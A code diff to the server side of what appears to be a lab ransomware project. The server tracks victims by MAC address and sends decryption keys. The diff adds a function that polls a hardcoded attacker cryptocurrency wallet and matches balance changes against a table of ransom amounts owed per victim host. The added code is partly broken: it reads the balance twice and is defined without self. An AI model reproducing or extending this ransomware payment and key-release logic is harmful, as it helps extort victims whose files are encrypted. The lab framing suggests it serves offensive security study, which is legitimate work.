@@ -12,6 +12,7 @@ import subprocess
 import errno
 import time
 from getmac import get_mac_address
+import cryptowallet
 #from io import BytesIO
 #import rsa
 
@@ -27,6 +28,8 @@ class Server:
     WORKING_DIR = '/home/attacker/Lab-On-Offensive-Attack/VictimsData'
     CODE_PATH = '/home/attacker/Lab-On-Offensive-Attack/mal.py'
     TRANSFER_DONE = False
+
+  
 
     def __init__(self, port):
         self._port = port
@@ -63,6 +66,9 @@ class Server:
         except socket.error:
             print('Server was not initialized due to an error.')
 
+
+
+    
     def make_dir(self, dir_name):
         path = os.path.join(Server.WORKING_DIR, dir_name)
         os.mkdir(path)
@@ -113,6 +119,29 @@ class Server:
 
         file.close() 
 
+
+    #Checks if a user has paid, if somebody has paid then it returns their id, if nobody has it returns null
+    def check_if_user_paid():
+        wallet_address = "tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv" #Attackers crypto wallet address
+        initial_balance =  cryptowallet.get_balance(wallet_address)
+
+        #TODO: Repolace with actual table
+        table_with_owed_money = [["host1", 0.23], ["host2", 0.001], ["host3", 00.2]]
+
+        user_that_paid = None
+
+        current_balance = cryptowallet.get_balance(wallet_address)
+        change = current_balance - initial_balance
+        
+        for row in table_with_owed_money:
+            if (change == row[1]):
+                user_that_paid = row[0]
+                table_with_owed_money.remove(row) #remove from owed money table
+
+
+        return user_that_paid
+
+
     def attack(self):
         # Establish a connection with the client.
         while True:
@@ -149,8 +178,12 @@ class Server:
                             print("yessss")
                             break
                     break
+                
+                
+
                     
                 else:
+                
                     # sends decryption key  
                     """ Opening and reading the private key file. """
                     #file_path = os.path.join(Server.WORKING_DIR, victim_mac)
